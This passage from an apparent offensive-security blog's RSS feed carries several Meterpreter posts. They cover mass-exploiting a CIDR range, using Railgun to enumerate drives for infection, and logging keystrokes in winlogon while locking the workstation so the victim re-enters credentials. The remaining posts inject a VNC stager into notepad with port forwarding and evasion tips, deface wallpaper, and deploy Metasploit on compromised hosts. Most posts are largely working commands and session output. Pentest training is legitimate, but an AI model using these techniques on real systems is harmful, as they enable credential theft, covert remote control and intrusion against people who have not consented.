&lt;p&gt;More setup, but this time for the ruby portion. Using Metasploit&amp;rsquo;s RangeWalker, we can take all kinds of input, an IP, a CIDR range, and even a line separated file of IP addresses using the &amp;ldquo;file:&amp;rdquo; prefix.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;&amp;lt;ruby&amp;gt;  
require &#39;rex/socket/range_walker&#39;  
rhosts = &amp;quot;192.168.92.0/24&amp;quot;  
iplist = Rex::Socket::RangeWalker.new(rhosts)  
iplist.each do |rhost|
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, we&amp;rsquo;ve included RangeWalker, parsed it, and loaded it into an &amp;lsquo;each&amp;rsquo; for loop.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;self.run_single&lt;/code&gt; function allows you to send commands like you were outside of the ruby block to msfconsole. We are setting the RHOST to each IP that RangeWalker parsed out, simple right?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;	self.run_single(&amp;quot;set RHOST #{rhost}&amp;quot;)  
	self.run_single(&amp;quot;exploit -j -z&amp;quot;)
end  
&amp;lt;/ruby&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&amp;rsquo;s it, we send all of the exploit modules one at a time to the background and tell it not to interact with it using the &amp;ldquo;-z -j&amp;rdquo; just as we did with multi/handler.&lt;/p&gt;

&lt;p&gt;Now, if your credentials worked on any of the IPs you&amp;rsquo;ll have sessions waiting for you.&lt;/p&gt;

&lt;p&gt;This can easily be extended with one more loop and a bit of shuffling to make this in to a SMB bruteforcer that accepts hashes!.&lt;/p&gt;

&lt;p&gt;Hope you learned a few things. Oh, and just a caveat, this is NOT quiet or stealthy and will probably get you caught on a blackbox pentest, but this is really great for the smash and grab style of  CTF competitions.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Intro to RailGun: WIN API for Meterpreter</title>
      <link>https://malicious.link/post/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/</link>
      <pubDate>Thu, 08 Jul 2010 02:10:34 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/</guid>
      <description>

&lt;p&gt;Back on June 13th, &amp;ldquo;Patrick HVE&amp;rdquo; released RAILGUN:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://mail.metasploit.com/pipermail/framework/2010-June/006382.html&#34;&gt;http://mail.metasploit.com/pipermail/framework/2010-June/006382.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712:
&lt;a href=&#34;http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712&#34;&gt;http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;iphlpapi&lt;/li&gt;
&lt;li&gt;ws2_32&lt;/li&gt;
&lt;li&gt;kernel32&lt;/li&gt;
&lt;li&gt;ntdll&lt;/li&gt;
&lt;li&gt;user32&lt;/li&gt;
&lt;li&gt;advapi32&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(You can find out exactly what functions are available by default in the api.rb file)&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s also very extensible, it doesn&amp;rsquo;t have a DLL or function you need? But you can read all about in the manual:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;./external/source/meterpreter/source/extensions/railgun/railgun_manual.pdf&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Here are two examples where this comes in very handy:&lt;/p&gt;

&lt;h2 id=&#34;list-drives&#34;&gt;List Drives:&lt;/h2&gt;

&lt;p&gt;The problem that I&amp;rsquo;ve had on a number of pentests is that you get shell, but from CMD or Meterpreter there is no good way to find all of the volumes (drives) attached.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;net use - Shows you what Network drives are connected, but not physical ones&lt;/li&gt;
&lt;li&gt;fsutil fsinfo drives - You must be an administrator to ride this train&lt;/li&gt;
&lt;li&gt;fdisk /status - Only on OLD versions of DOS, not sure when this disappeared&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;But railgun solves this problem with a really short script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;# Load the Railgun plugin  **_Update: You no longer need this step_**  
# client.core.use(&amp;quot;railgun&amp;quot;)   
# Make the API call to enum drive letters   
a = client.railgun.kernel32.GetLogicalDrives()[&amp;quot;return&amp;quot;]         
# Math magic to convert the binary to letters        
drives = []         
letters = &amp;quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;         
(0..25).each do |i|        
	test = letters[i,1]        
	rem = a % (2**(i+1))        
	if rem &amp;gt; 0        
		drives &amp;lt;&amp;lt; test        
		a = a - rem        
	end        
end         
print_line(&amp;quot;Drives Available = #{drives.inspect}&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;: &lt;code&gt;Drives Available = [&amp;quot;A&amp;quot;, &amp;quot;C&amp;quot;, &amp;quot;D&amp;quot;, &amp;quot;P&amp;quot;, &amp;quot;X&amp;quot;]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Save this as a meterpreter script and it&amp;rsquo;ll print every logical drive attached to the system even as a limited user (that the user can see).&lt;/p&gt;

&lt;p&gt;Logical drives include: (hdd, network, mass storage, optical, etc). This opens up the doors to infecting USB sticks and network drives…&lt;/p&gt;

&lt;h2 id=&#34;jedi-keylogging&#34;&gt;JEDI KEYLOGGING:&lt;/h2&gt;

&lt;p&gt;One of the problems with keylogging is you never know when that person will log in, and if you&amp;rsquo;re using a client side, they have probably already logged in and you&amp;rsquo;re hoping they log into a portal or some other password protected site.&lt;/p&gt;

&lt;p&gt;Railgun to the rescue again:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;# Start the keylogger running in the background dumping keys every 15 seconds, attached to Winlogon**   

meterpreter &amp;gt; bgrun keylogrecorder -c 1 -t 15        
[*] Executed Meterpreter with Job ID 0        
meterpreter &amp;gt; [*] winlogon.exe Process found, migrating into 640        
[*] Migration Successful!!        
[*] Starting the keystroke sniffer...        
[*] Keystrokes being saved in to /root/.msf3/logs/scripts/keylogrecorder/192.168.92.122_20100707.4539.txt        
[*] Recording         
  
# Drop to IRB to initialize railgun and lockout the workstation, forcing the user to use their credentials again.**

meterpreter &amp;gt; irb       
[*] Starting IRB shell        
[*] The &#39;client&#39; variable holds the meterpreter client

client.core.use(&amp;quot;railgun&amp;quot;)       
=&amp;gt; true        
client.railgun.user32.LockWorkStation()        
=&amp;gt; {&amp;quot;GetLastError&amp;quot;=&amp;gt;0, &amp;quot;return&amp;quot;=&amp;gt;true}        
exit        
meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Set up &amp;ldquo;tail -f&amp;rdquo; going on the log file for the keylogger and then kill the keylogger when you&amp;rsquo;ve gotten what you came for.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; bglist       
[*] Job 0: [&amp;quot;keylogrecorder&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;1&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;15&amp;quot;]        
meterpreter &amp;gt; bgkill 0        
[*] Killing background job 0...        
meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hope you have fun with railgun and shoot me an email &lt;a href=&#34;mailto:mubix@hak5.org&#34;&gt;mubix@hak5.org&lt;/a&gt; or leave a comment if you have any other crazy uses for railgun.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Set Wallpaper Meterpreter Script</title>
      <link>https://malicious.link/post/2010/2010-06-28-set-wallpaper-meterpreter-script/</link>
      <pubDate>Mon, 28 Jun 2010 20:34:43 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-06-28-set-wallpaper-meterpreter-script/</guid>
      <description>&lt;p&gt;Certainly nothing to fuss over, but I&amp;rsquo;ve had a fascination with setting my target&amp;rsquo;s wallpaper as sort of a calling card for years now. I&amp;rsquo;ve been able to set the registry key (HKCUControl PanelDesktopWallpaper), but until recently I didn&amp;rsquo;t know how to get it to refresh so that it displayed without forcing the user to log out&amp;hellip;&lt;/p&gt;

&lt;p&gt;First, is the most important part, selection of the wallpaper. This is my first selection:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201006_wallpaper_1.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;But, it has to be a BMP. So, I created:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://malicious.link/images/metasploit_1024.bmp&#34;&gt;metasploit_1024.bmp&lt;/a&gt; (2.3 MB)&lt;/p&gt;

&lt;p&gt;next run:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;reg add &amp;quot;HKCU\Control Panel\Desktop&amp;quot; /v Wallpaper /t REG_MULTI_SZ /d &amp;quot;C:\metasploit_1024.bmp&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;and finally the magic:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;rundll32.exe user32.dll,UpdatePerUserSystemParameters&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;thats it, run that, and it&amp;rsquo;ll refresh the settings and display the wallpaper in all of it&amp;rsquo;s glory. But I wouldn&amp;rsquo;t be a metasploit dog if I didn&amp;rsquo;t make it into a meterpreter script:&lt;/p&gt;

&lt;p&gt;download: &lt;a href=&#34;https://github.com/mubix/stuff/blob/master/metasploit/wallpaper.rb&#34;&gt;wallpaper.rb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;it&amp;rsquo;s definitely not ready to be in the trunk, but it works, just edit each of the options in the file to point at the bmp you want on the victim&amp;rsquo;s wallpaper and it&amp;rsquo;ll be there.&lt;/p&gt;

&lt;p&gt;Todo:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Make each parameter an option so there is no text editing involved&lt;/li&gt;
&lt;li&gt;Add the ability to convert other image types on the fly&lt;/li&gt;
&lt;li&gt;Figure out how to get the desktop color to refresh with the wallpaper&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>Meterpreter tunneling and VNC revamped</title>
      <link>https://malicious.link/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/</link>
      <pubDate>Tue, 15 Dec 2009 13:00:37 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/</guid>
      <description>

&lt;p&gt;So yesterday (December 14th, 2009) &lt;a href=&#34;http://twitter.com/hdmoore&#34;&gt;HD Moore&lt;/a&gt; posted &lt;a href=&#34;http://twitter.com/hdmoore/status/6663737357&#34;&gt;a tweet&lt;/a&gt; with a pic of the new VNC meterpreter script that he wrote:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/200912_vnc_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb&#34;&gt;https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Or you can get it via the SVN at &lt;a href=&#34;https://metasploit.com/redmine/projects/framework/repository/revisions/7872&#34;&gt;Revision 7872&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;By creating a bind payload instead of a reverse connect we can have the payload listen locally. Then with portfwd command (just like on your home router) we forward a local port to the local host on the remote side, to the binded port. Connecting to the freshly bound port as if we were actually doing everything on the box itself. Creating a new session and a nice beautiful VNC window.&lt;/p&gt;

&lt;h2 id=&#34;options&#34;&gt;Options:&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run vnc_oneport -h

OPTIONS:  
-e &amp;lt;opt&amp;gt; The process to run and inject into (default: notepad.exe)  
-h  This help menu  
-l &amp;lt;opt&amp;gt; The local port to listen on via port forwarding (default: 5901)  
-p &amp;lt;opt&amp;gt; The port on the remote host to bind VNC to (default: randomized)

meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;example-run&#34;&gt;Example Run:&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;[*] Meterpreter session 1 opened (192.168.92.103:4444 -&amp;gt; 192.168.92.113:1038)

meterpreter &amp;gt; **_run vnc_oneport_**
[*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207
[*] Host process notepad.exe has PID 532
[*] Allocated memory at address 0x00640000
[*] Writing the VNC stager into memory...
[*] Running Payload
[*] Creating a new thread within notepad.exe to run the VNC stager...
[*] Starting the port forwarding from 5901 =&amp;gt; TARGET:1207
[*] Local TCP relay created: 0.0.0.0:5901 &amp;lt;-&amp;gt; 127.0.0.1:1207

meterpreter &amp;gt; [*] VNC Server session 2 opened (127.0.0.1:56893 -&amp;gt; 127.0.0.1:5901)
Connected to RFB server, using protocol version 3.3
No authentication needed
Desktop name &amp;quot;VNCShell [SYSTEM@WORKSTATION1] - Full Access&amp;quot;
VNC server default format:
32 bits per pixel.
Least significant byte first in each pixel.
	True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
	Using default colormap which is TrueColor.  Pixel format:
	32 bits per pixel.
Least significant byte first in each pixel.
	True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
	Using shared memory PutImage
Same machine: preferring raw encoding
ShmCleanup called
[*] VNC Server session 2 closed.
meterpreter &amp;gt;
[*] Meterpreter session 1 opened (192.168.92.103:4444 -&amp;gt; 192.168.92.113:1038)  
meterpreter &amp;gt; run vnc_oneport  
[*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207  
[*] Host process notepad.exe has PID 532  
[*] Allocated memory at address 0x00640000  
[*] Writing the VNC stager into memory...  
[*] Running Payload  
[*] Creating a new thread within notepad.exe to run the VNC stager...  
[*] Starting the port forwarding from 5901 =&amp;gt; TARGET:1207  
[*] Local TCP relay created: 0.0.0.0:5901 &amp;lt;-&amp;gt; 127.0.0.1:1207  
meterpreter &amp;gt; [*] VNC Server session 2 opened (127.0.0.1:56893 -&amp;gt; 127.0.0.1:5901)  
Connected to RFB server, using protocol version 3.3  
No authentication needed  
Desktop name &amp;quot;VNCShell [SYSTEM@WORKSTATION1] - Full Access&amp;quot;VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
Using default colormap which is TrueColor.  Pixel format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
Using shared memory PutImageSame machine: preferring raw encodingShmCleanup called  
[*] VNC Server session 2 closed.

meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;note&#34;&gt;Note:&lt;/h2&gt;

&lt;p&gt;The forwarded port does not close even if the meterpreter session is ended, so use the following command to close the forward:&lt;/p&gt;

&lt;p&gt;```
meterpreter &amp;gt; portfwd delete -l 5901&lt;br /&gt;
[*] Successfully stopped TCP relay on 0.0.0.0:5901
meterpreter &amp;gt;&lt;/p&gt;

&lt;p&gt;(Note to BT4 users: do a &lt;code&gt;apt-get install vncviewer&lt;/code&gt; before using any of the vnc payloads in Metasploit)&lt;/p&gt;

&lt;p&gt;The script utilizes just one of the millions of way you can leverage &amp;lsquo;portfwd&amp;rsquo; in your endeavors. But where it gets interesting is the fact that the delivery method for the payload never touches disk. That magic is all credited to HD though. What happens is a new process is created (notepad by default) and the newly created VNC bind payload is injected into it. But, the beauty is that it&amp;rsquo;s doing local connections via the port forwarding so all you see in TCPView is:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/200912_vnc_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Now it&amp;rsquo;s definitely suspicious that Notepad has any connections at all, but you can use the option &lt;code&gt;-e&lt;/code&gt; to provide any executable you wish, as long as it&amp;rsquo;s in the path for the system. For examples, look at what&amp;rsquo;s running naturally already.&lt;/p&gt;

&lt;p&gt;Plus, you would probably not be using port 4444 for a meterpreter session. But what I wanted to demonstrate with this script is the power of both meterpreter, and port forwarding.&lt;/p&gt;

&lt;p&gt;Now it&amp;rsquo;s your turn to make it better. Take a look at the guts, see if anything will help you in your scripting.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Packet Captures with Meterpreter - 7zip - WinDump - and Nmap-ish</title>
      <link>https://malicious.link/post/2009/2009-10-03-packet-captures-with-meterpreter-7zip-windump-and-nmap-ish/</link>
      <pubDate>Sat, 03 Oct 2009 02:24:05 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-10-03-packet-captures-with-meterpreter-7zip-windump-and-nmap-ish/</guid>
      <description>&lt;p&gt;So this is a pretty crafty way of getting packet captures on a target system. Definitely could be streamlined with some meterpreter scripting fu, but awesome job on the video.&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&#34;//player.vimeo.com/video/6830384&#34; width=&#34;500&#34; height=&#34;375&#34; frameborder=&#34;0&#34; webkitallowfullscreen mozallowfullscreen allowfullscreen&gt;&lt;/iframe&gt; &lt;p&gt;&lt;a href=&#34;http://vimeo.com/6830384&#34;&gt;Metasploit meterpreter Windump/Winpcap sniffer&lt;/a&gt; from &lt;a href=&#34;http://vimeo.com/siles&#34;&gt;siles&lt;/a&gt; on &lt;a href=&#34;https://vimeo.com&#34;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit Framework as a Payload</title>
      <link>https://malicious.link/post/2009/2009-06-26-metasploit-framework-as-a-payload/</link>
      <pubDate>Fri, 26 Jun 2009 05:45:08 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-06-26-metasploit-framework-as-a-payload/</guid>
      <description>&lt;p&gt;Well, sorta…&lt;/p&gt;

&lt;p&gt;I created a meterpreter script that takes the cygwin bundled version of Metasploit inside of a NullSoft installer that HD Moore created and deploys it using meterpreter to the compromised host, extracts/installs it, and runs the shell. Now I left this intentionally open so that you could package your own cygwin bundle (possibly with nmap and netcat), for your own evil fun.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Thanks defintely go to Carlos Perez (Dark0perator) and HD Moore for their help getting this bad boy working right.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;You can download the script here: &lt;a href=&#34;https://github.com/mubix/stuff/blob/master/metasploit/deploymsf.rb&#34;&gt;https://github.com/mubix/stuff/blob/master/metasploit/deploymsf.rb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can download the cygwin installs from the metasploit website:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;13mb FULL framework: &lt;a href=&#34;https://github.com/mubix/stuff/blob/master/w32bins/metasploit_installers/framework-3.3-dev.exe?raw=true&#34;&gt;framework-3.3-dev.exe&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;5mb MINI (just msfconsole): &lt;a href=&#34;https://github.com/mubix/stuff/blob/master/w32bins/metasploit_installers/mini-3.3-dev.exe?raw=true&#34;&gt;mini-3.3-dev.exe&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And here is what it looks like:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run deploymsf -f framework-3.3-dev.exe  
[*] Running Meterpreter MSFp Deploytment Script.....  
[*] Uploading MSFp for for deployment....  
[*] MSFp uploaded as C:DOCUME~1mubixLOCALS~1Temp12681.exe  
[*] Installing MSFp...........  
[*] Done!  
[*] Installation Complete!  
[*] Running cygwin shell channelized...  
[*] Channel 18 created - Type: interact 18 to play  
[*] Be warned, it takes a bit for post setup to happen  
[*] and you will not see a prompt, try pwd to check  
meterpreter &amp;gt; interact 18  
Interacting with channel 18...  
  
[*] Configuring multi-user permissions for first run...  
[*] Configuring the initial user environment...  
pwd  
/home/mubix  
ls  
msfconsole  
*** Metasploit only has EXPERIMENTAL support for Ruby 1.9.1 and newer, things may break!  
*** Please report bugs to msfdev[at]metasploit.com  
[-] ***  
[-] * WARNING: No database support: LoadError no such file to load -- active_record  
[-] ***  
  
## ### ## ##  
## ## #### ###### #### ##### ##### ## #### ######  
####### ## ## ## ## ## ## ## ## ## ## ### ##  
####### ###### ## ##### #### ## ## ## ## ## ## ##  
## # ## ## ## ## ## ## ##### ## ## ## ## ##  
## ## #### ### ##### ##### ## #### #### #### ###  
##  
  
=[ msf v3.3-dev  
+ -- --=[ 379 exploits - 231 payloads  
+ -- --=[ 20 encoders - 7 nops  
=[ 156 aux  
  
msf &amp;gt;GAME OVER
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
  </channel>
</rss>
